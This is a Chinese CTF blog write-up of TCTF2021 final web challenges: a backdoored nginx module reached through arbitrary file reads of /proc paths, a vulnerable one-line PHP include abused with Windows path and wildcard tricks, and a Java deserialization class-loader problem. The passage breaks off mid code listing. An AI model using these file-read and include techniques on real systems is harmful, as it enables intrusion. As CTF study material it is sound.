@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[TCTF2021 final]复现作为垃圾选手在TCTF qual中被暴打，居然还能被邀请参加决赛，谢谢腾讯给我一个机会，被打的很惨，有机会的话明年还想来挨打。web一题没出，完全不会，赛后环境也急速关闭跑路了，只能根据附件和wp进行复现尝试 eeeenginx唯一做出来的一个题，还是个misc。。。给了一个nginx搭建的服务，有一个任意文件下载。乱翻是翻不到东西的，尝试读cmdline，读&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[TCTF2021 final]复现">
+<meta property="og:url" content="https://blog.z3ratu1.cn/[TCTF2021%20final]%E5%A4%8D%E7%8E%B0.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="[TCTF2021 final]复现作为垃圾选手在TCTF qual中被暴打，居然还能被邀请参加决赛，谢谢腾讯给我一个机会，被打的很惨，有机会的话明年还想来挨打。web一题没出，完全不会，赛后环境也急速关闭跑路了，只能根据附件和wp进行复现尝试 eeeenginx唯一做出来的一个题，还是个misc。。。给了一个nginx搭建的服务，有一个任意文件下载。乱翻是翻不到东西的，尝试读cmdline，读&amp;">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-09-28T08:45:34.000Z">
+<meta property="article:modified_time" content="2021-10-15T13:36:25.475Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/[TCTF2021%20final]%E5%A4%8D%E7%8E%B0.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>[TCTF2021 final]复现 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/[TCTF2021%20final]%E5%A4%8D%E7%8E%B0.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [TCTF2021 final]复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-09-28 16:45:34" itemprop="dateCreated datePublished" datetime="2021-09-28T16:45:34+08:00">2021-09-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-15 21:36:25" itemprop="dateModified" datetime="2021-10-15T21:36:25+08:00">2021-10-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%5BTCTF2021%20final%5D%E5%A4%8D%E7%8E%B0.html" class="post-meta-item leancloud_visitors" data-flag-title="[TCTF2021 final]复现" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%5BTCTF2021%20final%5D%E5%A4%8D%E7%8E%B0.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%5BTCTF2021%20final%5D%E5%A4%8D%E7%8E%B0.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="TCTF2021-final-复现"><a href="#TCTF2021-final-复现" class="headerlink" title="[TCTF2021 final]复现"></a>[TCTF2021 final]复现</h1><p>作为垃圾选手在TCTF qual中被暴打，居然还能被邀请参加决赛，谢谢腾讯给我一个机会，被打的很惨，有机会的话明年还想来挨打。web一题没出，完全不会，赛后环境也急速关闭跑路了，只能根据附件和wp进行复现尝试</p>
+<h2 id="eeeenginx"><a href="#eeeenginx" class="headerlink" title="eeeenginx"></a>eeeenginx</h2><p>唯一做出来的一个题，还是个misc。。。<br>给了一个nginx搭建的服务，有一个任意文件下载。<br>乱翻是翻不到东西的，尝试读cmdline，读&#x2F;proc&#x2F;self&#x2F;cmdline只读到是nginx的work进程，没用。再次复习老国王的读proc之术<br>先读<code>/sys/fs/cgroup/systemd/tasks</code>，能拿到所有的进程号，就能用<code>/proc/pid/cmdline</code>来看有什么内容了，看了一下，一号进程是nginx主进程，剩下的全是子进程，但是主进程中的cmdline是这样的</p>
+<pre><code>nginx: master process
+/usr/local/openresty/nginx/sbin/nginx -p /work/ -c conf/nginx.conf -g daemon off;
+</code></pre>
+<p>没用仔细研究过nginx命令行，但是这个work看起来就很像是工作目录之类的东西，直接读<code>/work/conf/nginx.conf</code>拿到配置文件。然后配置文件里写功能是lua脚本实现的，读lua脚本，也读不到什么东西，就是个正常的输入文件名，然后返回对应文件，搜了搜对应函数和功能，似乎也没有什么漏洞。<br>读了一波error.log，想从之前做出来的人手中获得些什么，没翻到什么有用的，老国王直接从哪翻出来了整个access.log。。。error log是直接配置在了当前目录下的log&#x2F;error.log下的，不知道access.log是在哪，当时没试现在环境没了，<code>/usr/local/nginx/logs/access.log</code>？还是也就在log下？或者<code>/usr/local/openresty/nginx/logs/access.log</code>?<br>然后我们翻着翻着，翻到了有意思的东西<br>突然出现了一句<code>/opt/module/ngx_http_eeenginx.c</code>一个nginx扩展模块？（我现在都不知道是从哪找到的nginx的扩展模块配置）读下来发现里面直接有一个shell功能，直接执行readflag，在提交的某个cookie为特定值时触发。有意思的是那个文件里还附带了这个恶意模块的作者。。。去GitHub上还真能搜到，并且仓库里的代码就和题目的别无二致，因为命令执行时是直接把标准输入输出给连到当前会话上了，所以要nc上去通信，因此作者还自己写了个客户端。。。用python发包也行，也能拿到错误信息，就是flag，而burp就因为收到的不是http包啥都不显示。<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/t57root/pwnginx">pwnginx</a></p>
+<h2 id="win-win"><a href="#win-win" class="headerlink" title="win-win"></a>win-win</h2><p>恐怕是唯一一个能被我理解的题目了。。。代码至善至美，又是经典1 line php（其实有三行），代码大概就是这个样子<br><code>&lt;?php highlight_file(__FILE__);readfile($_GET[&#39;win&#39;]);include __DIR__.$_GET[&#39;win&#39;];</code></p>
+<p>给了一个白的无过滤include，hint中说关了upload progress。<br>先用新学的pearcmd打一波。无反应，那就读一个&#x2F;etc&#x2F;passwd，读不到。试了半天只能读index.php，没有phpinfo，我一度怀疑上了个无敌的open basedir。试了试远程读取，应该开了allow url fopen，拼了目录，就算开了allow url include也没用，并且如果开了无敌的open basedir的话，没法打，于是乱按按出来了一个404报错，给我来了一句<code>Apache(Win32)</code>(还是win64来着，记不清了)，还附带了一个openssl版本，看起来不是一般的Apache，起码告诉我这是一个windows机器了。。<br>那么windows读什么？windows下&#x2F;etc&#x2F;passwd的等效替代品是C:&#x2F;windows&#x2F;win.ini，读到这个文件先确认任意文件读</p>
+<p>然后不会了，试着去猜了猜php.ini和httd.conf的路径，都猜不到，那就不知道接下来怎么打了</p>
+<h3 id="wp环节"><a href="#wp环节" class="headerlink" title="wp环节"></a>wp环节</h3><p>似乎还有很多解，不过都深入到了winapi这种超级底层，以及一个非常关键的windows下文件名通配符<br>这个东西我以前还写过。。。但是完全没记住呢，赛后rmb神仙和我提起我才想起来。。。又进行了额外的测试</p>
+<h3 id="ROIS解"><a href="#ROIS解" class="headerlink" title="ROIS解"></a>ROIS解</h3><p>ROIS用的是<code>\\.\C:</code>这样子的一个方式,windows下的特殊规则<code>\\.\X:</code>可以访问到X这个盘符，据他们所言这个操作能拿到整个C盘（那不是有几十个G？）然后他们就拿到了PHP上传文件时的默认路径，然后使用了windows下的文件通配符，直接包含文件上传时PHP产生的临时文件<br>这个方法我稍微试验了一下，访问这个C盘需要对C盘下所有文件夹及文件拥有权限，也就是得开administrator这个号，所以一般情况下这个方式也并不实用</p>
+<h3 id="NeSE解"><a href="#NeSE解" class="headerlink" title="NeSE解"></a>NeSE解</h3><p>类似，但是听起来更预期一些，我在比赛的时候就用相对目录确认了index.php是在<code>C:/xxx/index.php</code>目录下的，因为跳一层目录后可以读到win.ini。<br>但是那个时候没想起来可以利用windows文件通配符进行目录猜解，这里只有一层目录未知，是可以猜解出来路径名为<code>C:/htdocs/index.php</code>，不过我估计我猜解出这个目录也没什么用。。。并且据说神仙直接从404的报错中就猜出来了这个服务是用XAMPP安装的（我完全不知道怎么看出来的，就因为报错里多了个openssl的版本吗）<br>总之，htdocs是XAMPP安装时web根目录的名字，但是这里他改了httpd.conf，所以根目录的位置变了，但是安装一个XAMPP的话能知道里面的文件名和路径都是固定的，可以以此来爆破XAMPP的安装路径（当然需要安装路径也只有一个深度），获取到XAMPP路径后php.ini，Apache配置文件各种东西随便读，当然也是读到PHP放上传文件的临时目录，再用通配符进行匹配包含</p>
+<p>顺便记一下可以看的一些乱七八糟文件<br><code>C:\Windows\debug\NetSetup.log</code><br><code>C:\Windows\Logs\DISM\dism.log</code></p>
+<h3 id="Nu1l解"><a href="#Nu1l解" class="headerlink" title="Nu1l解"></a>Nu1l解</h3><p>不知道是什么，听说是webdav整出readfile缓存？<br>不会，但是找到了一个新玩具，procmon，可以监控文件系统之类的，下次玩一下<br>先咕，想起来了再复现</p>
+<h2 id="BuggyLoader"><a href="#BuggyLoader" class="headerlink" title="BuggyLoader"></a>BuggyLoader</h2><p>这个题刚看到我就想起来以前zsx写的一篇shiro classloader导致cc 3.1的链打不通的文章，也确实就是这么个东西，不过由于我是超级java废物所以不会，赛后才开始慢慢的复现<br>题目的依赖中有common-collection3.1，反序列化的ObjectInputStream是自己实现的，如下</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>yxxx<span class="token punctuation">.</span>buggyLoader<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectStreamClass<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URLClassLoader<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyObjectInputStream</span> <span class="token keyword">extends</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> ClassLoader classLoader<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token function">MyObjectInputStream</span><span class="token punctuation">(</span>InputStream inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        <span class="token keyword">super</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        URL<span class="token punctuation">[</span><span class="token punctuation">]</span> urls <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>URLClassLoader<span class="token punctuation">)</span>Transformer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getURLs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>classLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span>urls<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span>ObjectStreamClass desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>
+        Class <span class="token class-name">clazz</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>自己定义了一个ObjectInputStream，然后重写了resolveClass方法，用的classLoader的loadClass，而不是Class.forName<br>关于shiro的classloader的实现bug问题有很多相关链接，这里放几个，不过赛时由于没有自己动手调过，对这些文章的理解不太深刻，看了半天看不懂。。。。手动调了一个下午之后感觉又理解一些了呜呜<br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">Pwn a CTF Platform with Java JRMP Gadget</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.zsxsoft.com/post/35">强网杯“彩蛋”——Shiro 1.2.4(SHIRO-550)漏洞之发散性思考</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://w4nder.top/?p=410">shiro-1.2.4反序列化分析踩坑</a></p>
+<p><strong>整个问题的关键点就在orange文章中的那条评论里</strong></p>
+<blockquote>
+<p>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
+</blockquote>
+<p>也可以看这个Stack Overflow上的问题<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://stackoverflow.com/questions/30406524/loading-an-array-with-a-classloader">Loading an array with a classloader</a></p>
+<p>手动复制粘贴了他的代码进行调试，分别测试两个函数的结果</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">this</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<h3 id="双亲委派-review"><a href="#双亲委派-review" class="headerlink" title="双亲委派 review"></a>双亲委派 review</h3><p>classLoader.loadClass进去先是经典的双亲委派模型，这里我都有点忘了是什么了，后来复习了一下，才想起来是先找是否已经加载此类，未加载则一直往上找找到最顶层classloader，再从顶层开始加载，加载不到再委托下级classloader加载，最终抛出classNotFound异常<br>这篇文章里面有个图<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.jianshu.com/p/1e4011617650">java双亲委派机制及作用</a></p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">loadClass</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> <span class="token keyword">boolean</span> resolve<span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> ClassNotFoundException
+    <span class="token punctuation">{</span>
+        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token function">getClassLoadingLock</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">// First, check if the class has already been loaded</span>
+            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> c <span class="token operator">=</span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">long</span> t0 <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        c <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                        c <span class="token operator">=</span> <span class="token function">findBootstrapClassOrNull</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token comment" spellcheck="true">// ClassNotFoundException thrown if class not found</span>
+                    <span class="token comment" spellcheck="true">// from the non-null parent class loader</span>
+                <span class="token punctuation">}</span>
+
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token comment" spellcheck="true">// If still not found, then invoke findClass in order</span>
+                    <span class="token comment" spellcheck="true">// to find the class.</span>
+                    <span class="token keyword">long</span> t1 <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    c <span class="token operator">=</span> <span class="token function">findClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                    <span class="token comment" spellcheck="true">// this is the defining class loader; record the stats</span>
+                    sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span>PerfCounter<span class="token punctuation">.</span><span class="token function">getParentDelegationTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addTime</span><span class="token punctuation">(</span>t1 <span class="token operator">-</span> t0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span>PerfCounter<span class="token punctuation">.</span><span class="token function">getFindClassTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addElapsedTimeFrom</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span>PerfCounter<span class="token punctuation">.</span><span class="token function">getFindClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token function">resolveClass</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">return</span> c<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>经典双亲委派，先看有没有加载，自己没加载直接上去找父加载器有没有加载，每个classloader都是进这个函数，父加载器没有就进自己的findClass，如果找不到就抛出异常给下一级加载器catch</p>
+<h3 id="loadClass-debug"><a href="#loadClass-debug" class="headerlink" title="loadClass debug"></a>loadClass debug</h3><p>因为这里在进resolveClass时，desc.getName得到的值是<code>[Lorg.apache.commons.collections.Transformer;</code>开头的<code>[L</code>和结尾的<code>;</code>表示这是一个数组，而在findClass中，他是这么找的</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">findClass</span><span class="token punctuation">(</span><span class="token keyword">final</span> String name<span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> ClassNotFoundException
+    <span class="token punctuation">{</span>
+        <span class="token keyword">final</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> result<span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            result <span class="token operator">=</span> AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span>
+                <span class="token keyword">new</span> <span class="token class-name">PrivilegedExceptionAction</span><span class="token operator">&lt;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException <span class="token punctuation">{</span>
